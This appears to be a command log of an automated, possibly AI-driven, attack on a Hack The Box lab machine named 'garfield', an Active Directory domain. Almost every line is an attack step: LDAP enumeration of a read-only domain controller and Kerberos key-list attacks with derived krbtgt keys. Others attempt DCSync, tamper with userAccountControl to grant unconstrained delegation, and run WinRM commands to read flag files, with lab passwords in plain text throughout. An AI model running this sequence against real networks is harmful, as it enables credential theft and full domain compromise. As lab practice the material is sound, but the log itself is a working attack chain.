[19:43:03] RUN: cat /htb/machines/garfield/state/creds.jsonl 2>/dev/null | tail -20
[19:43:05] RUN: cat /etc/hosts | grep garfield
[19:43:11] RUN: ldapsearch -x -H ldap://10.129.17.158 -D 'l.wilson_adm@garfield.htb' -w 'P@ssw0rd2026!' -b 'DC=garfield,DC=htb' '(sAMAccountName=RODC01$)' msDS-RevealedUsers msDS-RevealedList managedBy distinguishedName 2>&1 | head -80
[19:43:18] RUN: ldapsearch -x -H ldap://10.129.17.158 -D 'l.wilson_adm@garfield.htb' -w 'P@ssw0rd2026!' -b 'DC=garfield,DC=htb' '(sAMAccountName=RODC01$)' msDS-RevealedList 2>&1 | grep -i admin
[19:43:20] RUN: impacket-keylistattack -rodcNo 8245 -rodcKey 'N3wR0dcP@ss!' -dc-ip 10.129.17.158 'garfield.htb/RODC01$:N3wR0dcP@ss!' 2>&1 | head -40
[19:43:23] RUN: which impacket-secretsdump 2>/dev/null; pip show impacket 2>/dev/null | head -3; find / -name "keylistattack*" -o -name "secretsdump*" 2>/dev/null | head -10
[19:43:28] RUN: python3 /home/hacker/.local/bin/keylistattack.py -rodcNo 8245 -rodcKey 'N3wR0dcP@ss!' -dc-ip 10.129.17.158 'garfield.htb/RODC01$:N3wR0dcP@ss!' 2>&1 | head -40
[19:43:32] RUN: python3 /home/hacker/.local/bin/keylistattack.py --help 2>&1 | head -30
[19:43:44] RUN: # First, derive the AES256 key for krbtgt_8245 from password
python3 -c "
from impacket.krb5.crypto import string_to_key, Key
from impacket.krb5 import constants
import binascii

password = 'KrbtgtPass123!'
# Standard salt for krbtgt: DOMAIN.COMkrbtgt
salt = 'GARFIELD.HTBkrbtgt_8245'
key = string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt)
print('AES256 (salt=GARFIELD.HTBkrbtgt_8245):', binascii.hexlify(key.contents).decode())

salt2 = 'GARFIELD.HTBkrbtgt'
key2 = string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, salt2)
print('AES256 (salt=GARFIELD.HTBkrbtgt):', binascii.hexlify(key2.contents).decode())
" 2>&1
[19:43:51] RUN: python3 /home/hacker/.local/bin/keylistattack.py -rodcNo 8245 -rodcKey '34fde0c7938a3897d3e6af304eaaf63485cc62b37986d73482b95d121d9db975' -dc-ip 10.129.17.158 -t Administrator -debug 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978@10.129.17.158' 2>&1 | head -60
[19:44:07] RUN: python3 -c "
from impacket.krb5.crypto import string_to_key
from impacket.krb5 import constants
import binascii

password = 'KrbtgtPass123!'
# Try various salt permutations
salts = [
    'GARFIELD.HTBkrbtgt_8245',
    'GARFIELD.HTBkrbtgt',
    'garfield.htbkrbtgt_8245',
    'GARFIELD.HTBKrbtgt_8245',
    'GARFIELD.HTBhost/rodc01.garfield.htb',
    '',
]
for s in salts:
    key = string_to_key(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, password, s)
    print(f'Salt={s!r:50s} -> {binascii.hexlify(key.contents).decode()}')
" 2>&1
[19:44:09] RUN: # Also try with the other salt using the second key
python3 /home/hacker/.local/bin/keylistattack.py -rodcNo 8245 -rodcKey 'caebace230390a90bea98cf9ccea9e265195d9180fcc29e78a207ea6321edcf0' -dc-ip 10.129.17.158 -t Administrator -debug 'garfield.htb/j.arbuckle:Th1sD4mnC4t!@1978@10.129.17.158' 2>&1 | head -30
[19:44:40] RUN: # Verify krbtgt_8245 password works by trying to get a TGT
python3 -c "
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.types import Principal
from impacket.krb5 import constants
import binascii

domain = 'garfield.htb'
username = 'krbtgt_8245'
password = 'KrbtgtPass123!'
dc = '10.129.17.158'

userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
try:
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, password, domain, b'', b'', None, dc)
    print('TGT obtained successfully!')
except Exception as e:
    print(f'Error: {e}')
" 2>&1
[19:44:50] RUN: # Try DCSync as RODC01$ - RODCs have limited replication rights for their cached users
impacket-secretsdump -just-dc-user Administrator 'garfield.htb/RODC01$:N3wR0dcP@ss!@10.129.17.158' -debug 2>&1 | head -30
[19:49:21] RUN: cat /htb/machines/garfield/state/creds.jsonl 2>/dev/null | grep -E 'l.wilson_adm|RODC01' | tail -5
[19:49:21] RUN: cat /htb/machines/garfield/state/surface.jsonl 2>/dev/null | grep -i 'rodc\|garfield\|domain' | tail -10
[19:49:27] RUN: ldapsearch -x -H ldap://10.129.17.158 -D 'l.wilson_adm@garfield.htb' -w 'P@ssw0rd2026!' -b 'DC=garfield,DC=htb' '(sAMAccountName=RODC01$)' userAccountControl 2>&1 | head -20
[19:49:38] RUN: python3 -c "v=83890176; print(f'Current UAC: {v} (0x{v:08X})'); flags={0x1:'SCRIPT',0x2:'ACCOUNTDISABLE',0x8:'HOMEDIR_REQUIRED',0x10:'LOCKOUT',0x20:'PASSWD_NOTREQD',0x40:'PASSWD_CANT_CHANGE',0x80:'ENCRYPTED_TEXT_PWD_ALLOWED',0x100:'TEMP_DUPLICATE_ACCOUNT',0x200:'NORMAL_ACCOUNT',0x800:'INTERDOMAIN_TRUST_ACCOUNT',0x1000:'WORKSTATION_TRUST_ACCOUNT',0x2000:'SERVER_TRUST_ACCOUNT',0x10000:'DONT_EXPIRE_PASSWORD',0x20000:'MNS_LOGON_ACCOUNT',0x40000:'SMARTCARD_REQUIRED',0x80000:'TRUSTED_FOR_DELEGATION',0x100000:'NOT_DELEGATED',0x200000:'USE_DES_KEY_ONLY',0x400000:'DONT_REQ_PREAUTH',0x800000:'PASSWORD_EXPIRED',0x1000000:'TRUSTED_TO_AUTH_FOR_DELEGATION',0x4000000:'PARTIAL_SECRETS_ACCOUNT'}; [print(f'  {name}') for bit,name in flags.items() if v & bit]"
[19:49:42] RUN: python3 -c "new_val = 83890176 | 0x80000; print(f'New UAC with TRUSTED_FOR_DELEGATION: {new_val} (0x{new_val:08X})')"
[19:49:43] RUN: bloodyAD -d garfield.htb -u 'l.wilson_adm' -p 'P@ssw0rd2026!' --host 10.129.17.158 set object 'RODC01$' userAccountControl -v 84414464 2>&1
[19:49:56] RUN: python3 -c "
import ldap3
server = ldap3.Server('ldap://10.129.17.158', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='l.wilson_adm@garfield.htb', password='P@ssw0rd2026!', authentication=ldap3.NTLM)
conn.bind()
print('Bind:', conn.result)
dn = 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb'
conn.modify(dn, {'userAccountControl': [(ldap3.MODIFY_REPLACE, [84414464])]})
print('Modify result:', conn.result)
conn.unbind()
" 2>&1
[19:50:00] RUN: python3 -c "
import ldap3
server = ldap3.Server('ldap://10.129.17.158', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='garfield.htb\\\\l.wilson_adm', password='P@ssw0rd2026!', authentication=ldap3.NTLM)
conn.bind()
print('Bind:', conn.result)
dn = 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb'
conn.modify(dn, {'userAccountControl': [(ldap3.MODIFY_REPLACE, [84414464])]})
print('Modify result:', conn.result)
conn.unbind()
" 2>&1
[19:50:17] RUN: python3 -c "
import ldap3
server = ldap3.Server('ldap://10.129.17.158', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='garfield.htb\\\\l.wilson_adm', password='P@ssw0rd2026!', authentication=ldap3.NTLM)
conn.bind()
# Try removing TRUSTED_TO_AUTH_FOR_DELEGATION and adding TRUSTED_FOR_DELEGATION instead
# Current: 0x05001000 = WORKSTATION_TRUST_ACCOUNT | TRUSTED_TO_AUTH_FOR_DELEGATION | PARTIAL_SECRETS_ACCOUNT
# Try: WORKSTATION_TRUST_ACCOUNT | TRUSTED_FOR_DELEGATION | PARTIAL_SECRETS_ACCOUNT = 0x04081000
new_val = 0x1000 | 0x80000 | 0x4000000  # without TRUSTED_TO_AUTH_FOR_DELEGATION
print(f'Trying UAC: {new_val} (0x{new_val:08X})')
dn = 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb'
conn.modify(dn, {'userAccountControl': [(ldap3.MODIFY_REPLACE, [new_val])]})
print('Modify result:', conn.result)

# Also try just flipping TRUSTED_FOR_DELEGATION alone by keeping exact current + flag
# Current exact: 83890176 = 0x05001000
new_val2 = 83890176 | 0x80000
print(f'Trying UAC (additive): {new_val2} (0x{new_val2:08X})')
conn.modify(dn, {'userAccountControl': [(ldap3.MODIFY_REPLACE, [new_val2])]})
print('Modify result 2:', conn.result)

conn.unbind()
" 2>&1
[19:50:24] RUN: python3 -c "
import ldap3
server = ldap3.Server('ldap://10.129.17.158', get_info=ldap3.ALL)
conn = ldap3.Connection(server, user='garfield.htb\\\\l.wilson_adm', password='P@ssw0rd2026!', authentication=ldap3.NTLM)
conn.bind()
dn = 'CN=RODC01,OU=Domain Controllers,DC=garfield,DC=htb'
# Test if we can modify UAC at all - try setting to same value
conn.modify(dn, {'userAccountControl': [(ldap3.MODIFY_REPLACE, [83890176])]})
print('Same value result:', conn.result)
# Try removing PARTIAL_SECRETS and setting unconstrained (SERVER_TRUST + TRUSTED_FOR_DELEGATION)
new_val = 0x2000 | 0x80000  # SERVER_TRUST_ACCOUNT + TRUSTED_FOR_DELEGATION = standard unconstrained DC
print(f'Trying DC-style UAC: {new_val}')
conn.modify(dn, {'userAccountControl': [(ldap3.MODIFY_REPLACE, [new_val])]})
print('DC-style result:', conn.result)
conn.unbind()
" 2>&1
[19:51:12] RUN: crackmapexec winrm 10.129.17.158 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -x 'whoami /all' 2>&1
[19:51:21] RUN: crackmapexec winrm 10.129.17.158 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -x 'type C:\Users\l.wilson_adm\Desktop\user.txt 2>nul & type C:\Users\Administrator\Desktop\root.txt 2>nul & hostname & ipconfig /all' 2>&1
[19:51:30] RUN: crackmapexec winrm 10.129.17.158 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -x 'hostname' 2>&1
[19:51:31] RUN: crackmapexec winrm 10.129.17.158 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -x 'dir C:\Users' 2>&1
[19:51:44] RUN: crackmapexec winrm 10.129.17.158 -u l.wilson_adm -p 'P@ssw0rd2026!' -d garfield.htb -x 'type C:\Users\l.wilson_adm\Desktop\user.txt' 2>&1
